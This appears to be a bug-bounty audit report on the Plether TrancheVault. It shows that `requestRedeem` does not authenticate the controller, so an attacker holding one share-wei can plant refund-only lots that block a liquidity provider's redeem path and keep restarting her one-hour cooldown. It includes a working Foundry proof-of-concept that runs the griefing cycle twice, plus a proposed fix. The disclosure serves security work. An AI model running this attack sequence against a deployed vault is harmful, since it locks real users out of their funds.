# \#97857 [SC-Low] Anyone holding one share-wei can plant an unclaimable redeem lot at the head of an LP's queue; the LP must choose between a dead withdrawal path and a one-hour lock on her shares, every hour

**Submitted on Nov 3rd 2026 at 16:01:42 UTC by @Afriauditor for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97857
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
  - Contract fails to deliver promised returns, but doesn't lose value

## Description


## Summary

`TrancheVault.requestRedeem(shares, controller, owner)` checks that the caller may spend `owner`'s shares but puts no condition on `controller`, the account whose queue receives the request. A fresh address holding exactly one share-wei passes the minimum-size check through the full-balance exemption and files a request naming any LP as controller. Filed one second before the request cutoff into an epoch that is empty at that moment, the lot quotes to 0 USDG, cannot be funded, settles refund-only, and becomes the head of the LP's controller queue. From then on the withdrawal functions the protocol documents as the LP exit path — `redeem`, `withdraw`, `maxRedeem`, `maxWithdraw` — read that lot and return 0 or revert, even while her own later request is fully funded. She can still collect by request ID, but that leaves the lot in place. The only way to remove it is `claimRedeemRefund`, which must deliver the share-wei to her and restarts her one-hour cooldown: no new redemption request and no share transfer for exactly 3,600 seconds. The attacker plants the next lot into the epoch that matures the moment her lock ends, so her first allowed request lands behind a fresh lot again. An LP exiting in tranches pays an extra hour and an extra transaction per tranche for as long as the attacker keeps spending one share-wei an hour.


## Description

**Request admission authenticates the wrong party.** `requestRedeem` (`TrancheVault.sol:606-632`) checks `owner`'s cooldown (617), `maxRequestRedeem(owner)` (620-623), the minimum size (624) and `owner`'s allowance or operator status (625-627). `controller` is only checked against `address(0)` (611). Its sibling `requestRedeemFromClaimableDeposit` calls `_requireControllerAuth(controller)` (658); the ordinary path does not. The request is enqueued under `controller` by `_enqueueRedeemRequest` → `_appendControllerRedeem` (688-708, 1783-1797) and, when the controller has no older pending request, becomes `controllerRedeemHead[controller]`.

**One share-wei is enough.** `_requireMinimumRedeemSize` (1611-1617) rejects a request only when it is worth less than the minimum *and* smaller than the owner's whole available balance. An address holding exactly one share-wei redeems its whole balance and passes. Share transfers are free once the sender's cooldown has elapsed (`_update`, 325-331), and the recipient inherits that already-expired timestamp, so one 1 USDG deposit seeds as many dust addresses as the attacker needs, one per hour.

**Placement is chosen, not lucky.** `_requestEpochWindow` (545-556) sends a request filed before `nextRequestCutoffTime` — five minutes before the hour (`LP_REQUEST_CUTOFF_DURATION`, line 39) — into epoch e+1 and anything filed from the cutoff on into e+2. The attacker reads `redeemEpochs(e+1).shares`, files at `cutoff − 1` if it is zero, and anyone requesting afterwards lands behind the lot. The genuine precondition is a tranche with at least one hour in which nobody else redeems.

**The lot can only be refund-only.** `fundRedeemEpoch` rejects `assets == 0` (~1488). In `HousePool._fundRedemptionPhase` (957-986) a matured head whose quote is zero goes to `refundRedeemEpochRemainder`, which sets `refundEnabled` and leaves the shares in escrow with `fundedShares == 0`.

**The documented exit path dies.** `maxRedeem`/`maxWithdraw` (1301-1313) and `redeem`/`withdraw` (998-1012 → `_claimRedeem`/`_claimWithdraw`, 1148-1199) operate on `controllerRedeemHead[controller]`. For the planted lot `claimableRedeemRequest` is 0, so the views return 0 and the claims revert `ERC4626ExceededMaxRedeem`/`ExceededMaxWithdraw`, whatever is funded behind it. `CANONICAL_ENTRYPOINTS.md:191-192` names exactly these functions as how LP exits are claimed; the explicit-ID functions are described as the integration variant (`IAsyncTrancheVault.sol:8-10`). `claimRedeem(requestId, …)` (1014-1021) does pay her and does not touch her timestamp, but it does not remove the lot.

**Clearing is the trap.** `cancelRedeemRequest` is only available before the lot's epoch begins (894), and she notices after settlement, so `claimRedeemRefund` (916-948) is the only remedy. The refund must go to the controller (`_requireShareReceiver`, 931), the shares are nonzero, and the function writes `lastDepositTime[receiver] = block.timestamp` (943). `requestRedeem` then reverts `DepositCooldown` (617), `maxRequestRedeem` returns 0 (1329-1334) and every share transfer reverts `TransferDuringCooldown` (325-327) until exactly one hour later. The restart itself is documented for refunds (`SECURITY.md:1399`); what is not intended is that a stranger can create the refund.

**The rolling cycle.** Her lock ends at `clearedAt + 3600`. The epoch that matures at that instant has its cutoff at `clearedAt + 3300`, so the attacker plants into it at `clearedAt + 3299`. Her first permitted request, at `clearedAt + 3600`, can only land in the following epoch — behind the new lot. When it settles, the canonical path is dead again, she clears again, and the clock restarts again. The PoC runs this cycle twice.

Not a duplicate of Cecuro LOW-39/40 (claim-side dust receivers, fixed by `receiver == controller`) or LOW-67 (dust burned in a shared epoch): those concern claims and merged epochs; this is request-side injection into another controller's queue, and the LOW-39/40 fix is what makes the cooldown restart unavoidable. In a shared epoch the dust lot is owed one share and a plain `redeem` clears it without a reset, which is why the attacker targets an empty epoch.

## Impact

**Medium — griefing.** For one share-wei an hour — which the victim ends up holding — plus gas, an attacker makes every LP exit through the documented path a two-step affair with a one-hour lock attached, indefinitely. Each cycle the LP either leaves her standard `redeem`/`withdraw` broken with the junk lots accumulating, or clears and loses an hour of liquidity on her entire position: no new redemption request, no transfer, including of the share-wei she was just handed. Stop-loss-style exits that depend on being able to request promptly are delayed by an hour per round. The attacker gains nothing; that is the griefing definition. Materially: in the PoC, two exit tranches cost Alice two extra transactions and two hours of lockout.

**Low — ** No value is lost. Her funded redemptions remain claimable by request ID throughout, the lock starts only when she chooses to clear, and it lasts one hour per clearing. On that reading the vault fails to deliver its documented exit path and its stated cooldown-isolation goal, without touching funds.

Fix: add `_requireControllerAuth(controller)` to `requestRedeem` (and `requestDeposit`, which has the same shape), matching `requestRedeemFromClaimableDeposit`; ERC-7540 requires owner authorization and does not forbid also requiring the controller's. Alternatively, skip the `lastDepositTime` restart in `claimRedeemRefund` when the refunded lot was not filed by the controller or its operator.



## Proof of Concept

## Proof of Concept

`packages/perps/test/perps/poc/PoC_RedeemLotInjection.t.sol` (attached). Run with `forge test --root packages/perps --match-path test/perps/poc/PoC_RedeemLotInjection.t.sol -vv`. Passes on the repository's `BasePerpTest`/`HousePoolAsyncTestBase` stack.

What it shows, in order. Round one: the attacker verifies on-chain that the target epoch is empty and files at `cutoff − 1`; Alice files at the cutoff and lands in the next epoch; one settlement leaves the lot refund-only and Alice's epoch funded; `maxRedeem`/`maxWithdraw` are 0 and `redeem`/`withdraw` revert; the explicit-ID claim pays her without a cooldown change but the lot is still the head; `claimRedeemRefund` hands her the share-wei and restarts her cooldown; `requestRedeem` reverts `DepositCooldown` at +0 and +3,599 s and transfers revert. Round two: at +3,299 s the attacker plants into the epoch that matures at +3,600 s; Alice's request at exactly +3,600 s succeeds but lands behind it; after settlement the canonical path is dead again; clearing restarts her cooldown a second time and the share-wei she received is itself locked. The attacker spent two share-wei and no settlement token.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {HousePoolAsyncTestBase} from "../shared/HousePoolTestBase.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {ERC4626} from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";

contract PoC_RedeemLotInjection is HousePoolAsyncTestBase {

    address internal constant ALICE = address(0xA11CE); // victim LP
    address internal constant MALLORY = address(0x5A1); // griefer: one 1 USDG deposit, kept as shares
    address internal constant DUST = address(0xD057); // fresh address holding exactly 1 share-wei
    address internal constant DUST2 = address(0xD058); // second fresh address for the next hour's lot
    address internal constant BOB = address(0xB0B);
    uint256 internal constant ALICE_DEPOSIT = 100_000e6;

    function setUp() public override {
        super.setUp();
        _fundJunior(ALICE, ALICE_DEPOSIT);
        _fundJunior(MALLORY, pool.minTrancheDepositAssets()); // 1 USDG
        _finishAsyncCooldown(juniorVault, MALLORY);
        vm.startPrank(MALLORY);
        juniorVault.transfer(DUST, 1); // fresh addresses inherit her already-expired timestamp
        juniorVault.transfer(DUST2, 1);
        vm.stopPrank();
        _finishAsyncCooldown(juniorVault, ALICE);
    }

    function test_PlantedLotBlocksCanonicalClaimsAndClearingItRestartsCooldown() public {
        uint256 half = juniorVault.balanceOf(ALICE) / 2;

        // 1. Plant: last second before the cutoff, into an epoch the attacker has verified is empty.
        (uint256 targetEpoch, uint256 cutoff) = juniorVault.getRequestEpochWindow();
        vm.warp(cutoff - 1);
        (uint256 epochSharesBefore,,,,,,,,,) = juniorVault.redeemEpochs(targetEpoch);
        assertEq(epochSharesBefore, 0, "precondition the attacker verifies on-chain: target epoch is empty");
        vm.prank(DUST);
        uint256 lot = juniorVault.requestRedeem(1, ALICE, DUST); // shares == maxShares: dust exemption applies
        assertEq(lot, targetEpoch);
        assertEq(juniorVault.controllerRedeemHead(ALICE), lot, "lot is the head of Alice's controller queue");

        // 2. Alice files at the cutoff and lands in the next epoch, behind the lot.
        vm.warp(cutoff);
        uint256 aliceRequest = _requestAsyncRedeem(juniorVault, ALICE, half);
        assertEq(aliceRequest, lot + 1);

        // 3. Settlement: the 1-wei epoch quotes to 0 USDG, so it can only become refund-only.
        _settleAsyncRequest(aliceRequest, true);
        assertEq(juniorVault.refundableRedeemRequest(lot, ALICE), 1, "planted lot is refund-only");
        assertEq(juniorVault.claimableRedeemRequest(aliceRequest, ALICE), half, "Alice's own epoch is funded");
        uint256 aliceAssets = juniorVault.claimableRedeemAssets(aliceRequest, ALICE);
        assertGt(aliceAssets, 0);

        // 4. Canonical claims (CANONICAL_ENTRYPOINTS.md:191-192) are dead while the lot is the head.
        assertEq(juniorVault.maxRedeem(ALICE), 0);
        assertEq(juniorVault.maxWithdraw(ALICE), 0);
        vm.startPrank(ALICE);
        vm.expectRevert(abi.encodeWithSelector(ERC4626.ERC4626ExceededMaxRedeem.selector, ALICE, half, 0));
        juniorVault.redeem(half, ALICE, ALICE);
        vm.expectRevert(abi.encodeWithSelector(ERC4626.ERC4626ExceededMaxWithdraw.selector, ALICE, aliceAssets, 0));
        juniorVault.withdraw(aliceAssets, ALICE, ALICE);

        // 5. Explicit-id claim pays her and leaves the cooldown alone, but the lot stays at the head.
        uint256 snapshot = vm.snapshotState();
        uint256 cooldownBefore = juniorVault.lastDepositTime(ALICE);
        assertEq(juniorVault.claimRedeem(aliceRequest, half, ALICE, ALICE), aliceAssets);
        assertEq(juniorVault.lastDepositTime(ALICE), cooldownBefore);
        assertEq(juniorVault.controllerRedeemHead(ALICE), lot);
        assertEq(juniorVault.maxRedeem(ALICE), 0);
        vm.revertToState(snapshot);

        // 6. Clearing the lot: refund must go to the controller, so Alice gets the share-wei and a fresh cooldown.
        uint256 clearedAt = vm.getBlockTimestamp();
        assertEq(juniorVault.claimRedeemRefund(lot, ALICE, ALICE), 1);
        assertEq(juniorVault.lastDepositTime(ALICE), clearedAt, "cooldown restarted");
        assertEq(juniorVault.maxRedeem(ALICE), half, "canonical path works again");
        assertEq(juniorVault.redeem(half, ALICE, ALICE), aliceAssets);

        uint256 rest = juniorVault.balanceOf(ALICE) - 1;
        assertEq(juniorVault.maxRequestRedeem(ALICE), 0);
        vm.expectRevert(TrancheVault.TrancheVault__DepositCooldown.selector);
        juniorVault.requestRedeem(rest, ALICE, ALICE);
        vm.expectRevert(TrancheVault.TrancheVault__TransferDuringCooldown.selector);
        juniorVault.transfer(BOB, 1);
        vm.warp(clearedAt + 3599);
        vm.expectRevert(TrancheVault.TrancheVault__DepositCooldown.selector);
        juniorVault.requestRedeem(rest, ALICE, ALICE);
        vm.stopPrank();

        // 7. The rolling cycle: the epoch maturing at clearedAt + 3600 has its cutoff at clearedAt + 3300. The
        //    attacker plants into it one second before; Alice's first allowed request can only land behind it.
        vm.warp(clearedAt + 3299);
        (uint256 target2, uint256 cutoff2) = juniorVault.getRequestEpochWindow();
        assertEq(cutoff2, clearedAt + 3300);
        (uint256 shares2,,,,,,,,,) = juniorVault.redeemEpochs(target2);
        assertEq(shares2, 0, "next hour's target epoch is empty too");
        vm.prank(DUST2);
        uint256 lot2 = juniorVault.requestRedeem(1, ALICE, DUST2);
        assertEq(lot2, target2);

        vm.warp(clearedAt + 3600);
        vm.prank(ALICE);
        uint256 aliceRequest2 = juniorVault.requestRedeem(rest, ALICE, ALICE); // succeeds exactly one hour later...
        assertEq(aliceRequest2, lot2 + 1, "...and lands behind the lot planted while she was locked out");

        _settleAsyncRequest(aliceRequest2, true);
        assertEq(juniorVault.refundableRedeemRequest(lot2, ALICE), 1, "second lot is refund-only");
        assertEq(juniorVault.claimableRedeemRequest(aliceRequest2, ALICE), rest, "her second epoch is funded");
        assertEq(juniorVault.maxRedeem(ALICE), 0, "canonical path dead again");

        vm.startPrank(ALICE);
        uint256 clearedAt2 = vm.getBlockTimestamp();
        assertEq(juniorVault.claimRedeemRefund(lot2, ALICE, ALICE), 1);
        assertEq(juniorVault.lastDepositTime(ALICE), clearedAt2, "cooldown restarted a second time");
        juniorVault.redeem(rest, ALICE, ALICE); // her funded claim is collectable only after the second clearing
        vm.expectRevert(TrancheVault.TrancheVault__TransferDuringCooldown.selector);
        juniorVault.transfer(BOB, 1); // the share-wei she was handed is itself locked for another hour
        vm.stopPrank();

        // Attacker side: two share-wei gone (both to Alice), no settlement token spent.
        assertEq(juniorVault.balanceOf(DUST), 0);
        assertEq(juniorVault.balanceOf(DUST2), 0);
        assertEq(settlementToken.balanceOf(MALLORY), 0);
        emit log_named_uint("hours of lockout imposed across two exit tranches", 2);
    }
}
```
